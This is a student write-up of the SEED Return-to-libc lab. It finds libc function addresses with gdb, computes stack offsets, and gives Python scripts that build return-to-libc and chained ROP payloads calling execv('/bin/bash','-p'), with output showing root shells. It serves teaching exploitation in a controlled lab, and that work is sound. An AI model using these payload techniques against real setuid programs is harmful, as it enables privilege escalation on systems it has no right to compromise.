# Return-to-libc Attack Lab

## Task 1: Finding out the Addresses of `libc` Functions

`gdb` output:

```
Breakpoint 1, 0x565562ef in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e12420 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
gdb-peda$ quit
```

## Task 2: Putting the shell string in the memory

Shell output:

```
$ gcc -m32 -fno-stack-protector -z noexecstack -o prtenv prtenv.c
$ ./prtenv
ffffd38a
```

## Task 3: Launching the Attack

We have the three addresses that we need from the outputs above. It remains to calculate the offsets that we should put them into in the badfile.

Running `./retlib`:

```
$ ./retlib
Address of input[] inside main():  0xffffcd00
Input size: 0
Address of buffer[] inside bof():  0xffffccd0
Frame Pointer value inside bof():  0xffffcce8
(^_^)(^_^) Returned Properly (^_^)(^_^)
```

We can see that the frame pointer is at offset `0x18` from the base of the buffer. Above this in memory is the address to return to from `bof()`, which is at offset `0x1c` in the badfile; this is where we put the address of `system()`, and thus `Y = 0x1c`.

After the return instruction, we resume execution in the prologue of the `system()` function, which will put its own saved previous frame pointer at badfile offset `0x1c`. Hence, the values that `system()` takes as its return address and parameter are located above this at badfile offsets `0x20` and `0x24` respectively. We specify the address of `exit()` as the address to return to from `system()`, so `Z = 0x20`; and we specify the address of our `"/bin/sh"` string as the parameter for `system()`, so `X = 0x24`.

Running `./retlib` now:

```
$ ./exploit.py
$ ./retlib 
Address of input[] inside main():  0xffffcd00
Input size: 300
Address of buffer[] inside bof():  0xffffccd0
Frame Pointer value inside bof():  0xffffcce8
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=...
```

### Attack variation 1

When retrying the attack without including the address of `exit()`, we are still successful in obtaining a root shell; however, upon exiting the root shell, a segmentation fault occurs (which was not the case before). The attack is thus easier to detect, since the system could be set to log segfaults or even notify admins of them.

### Attack variation 2

After `retlib` is renamed to `newretlib`, the attack now fails. This is because the `MYSHELL` environment variable, which we set to `"/bin/sh"`, is now at a different address in memory, because the name of the program is also present somewhere above it on the stack.

In fact, we can see direct evidence of this from the output of running `./retlib`:

```
$ ./newretlib
Address of input[] inside main():  0xffffcd00
Input size: 300
Address of buffer[] inside bof():  0xffffccd0
Frame Pointer value inside bof():  0xffffcce8
zsh:1: command not found: h
```

It seems that the address of `MYSHELL` that we had determined previously now points 6 characters into the string instead, possibly implying that the name of the program is present above it in the stack twice, since each occurrence would change the stack size by 3, the difference in name length.

## Task 4: Defeat Shell's countermeasure

Using `gdb` to find the address of `execv`:

```
gdb-peda$ p execv
$3 = {<text variable, no debug info>} 0xf7e994b0 <execv>
```

Since the entire badfile will be read into the `input[]` array in the `main()` function regardless of null terminators, we can construct a badfile which itself contains all the strings we need, without relying on environment variables.

The code to construct the new badfile is shown below. The placement of the syscall and parameter addresses in the badfile are calculated as in Task 3; the contents of `argv[]` can be arranged above this in the badfile at will, keeping in mind that pointers back into the contents of the badfile should be relative to the address of `input[]`, which contains the entire badfile.

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

def write_int(arr, i, x):
    '''Write int x as little-endian bytes into bytearray arr from index i.'''
    arr[i:i+4] = x.to_bytes(length=4, byteorder="little")

def write_str(arr, i, s):
    '''Write string s as bytes into bytearray arr from index i including null terminator.'''
    arr[i:i+len(s)] = s.encode("utf-8")
    arr[i+len(s)] = 0x00  # null terminator


# absolute address of input buffer
# pointers back into the payload will be relative to this address
bufaddr = 0xffffcd00

write_int(content, 0x1c, 0xf7e994b0)      # address of execv()
write_int(content, 0x20, 0xf7e04f80)      # address of exit()
write_int(content, 0x24, bufaddr + 0x38)  # address of "/bin/bash"
write_int(content, 0x28, bufaddr + 0x2c)  # address of argv[]

write_int(content, 0x2c, bufaddr + 0x38)  # argv[0]: address of "/bin/bash"
write_int(content, 0x30, bufaddr + 0x42)  # argv[1]: address of "-p"
write_int(content, 0x34, 0x0)             # argv[2]: NULL

write_str(content, 0x38, "/bin/bash")     # "/bin/bash"
write_str(content, 0x42, "-p")            # "-p"


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

Result:

```
$ ./exploit.py
$ ./retlib
Address of input[] inside main():  0xffffcd00
Input size: 300
Address of buffer[] inside bof():  0xffffccd0
Frame Pointer value inside bof():  0xffffcce8
bash-5.0# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=...
```

## Task 5: Return-Oriented Programming

Using `gdb` to find the address of `foo()`:

```
gdb-peda$ p &foo
$1 = (<text variable, no debug info> *) 0x565562b0 <foo>
```

We make space in the badfile for 10 consecutive copies of the address of `foo()`, starting at the offset of `bof()`'s saved return address. Upon each return to `foo()`, the next copy of `foo()`'s address in the badfile becomes the saved return address to use next.

Code to generate the badfile: (only the relevant section changed from Task 4)

```python
bufaddr = 0xffffcd00

# address of foo(), 10 times
for i in range(10):
    write_int(content, 0x1c + 4*i, 0x565562b0)

write_int(content, 0x44, 0xf7e994b0)      # address of execv()
write_int(content, 0x48, 0xf7e04f80)      # address of exit()
write_int(content, 0x4c, bufaddr + 0x60)  # address of "/bin/bash"
write_int(content, 0x50, bufaddr + 0x54)  # address of argv[]

write_int(content, 0x54, bufaddr + 0x60)  # argv[0]: address of "/bin/bash"
write_int(content, 0x58, bufaddr + 0x6a)  # argv[1]: address of "-p"
write_int(content, 0x5c, 0x0)             # argv[2]: NULL

write_str(content, 0x60, "/bin/bash")     # "/bin/bash"
write_str(content, 0x6a, "-p")            # "-p"
```

Result:

```
$ ./exploit.py
$ ./retlib
Address of input[] inside main():  0xffffcd00
Input size: 300
Address of buffer[] inside bof():  0xffffccd0
Frame Pointer value inside bof():  0xffffcce8
Function foo() is invoked 1 times
Function foo() is invoked 2 times
Function foo() is invoked 3 times
Function foo() is invoked 4 times
Function foo() is invoked 5 times
Function foo() is invoked 6 times
Function foo() is invoked 7 times
Function foo() is invoked 8 times
Function foo() is invoked 9 times
Function foo() is invoked 10 times
bash-5.0# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=...
```

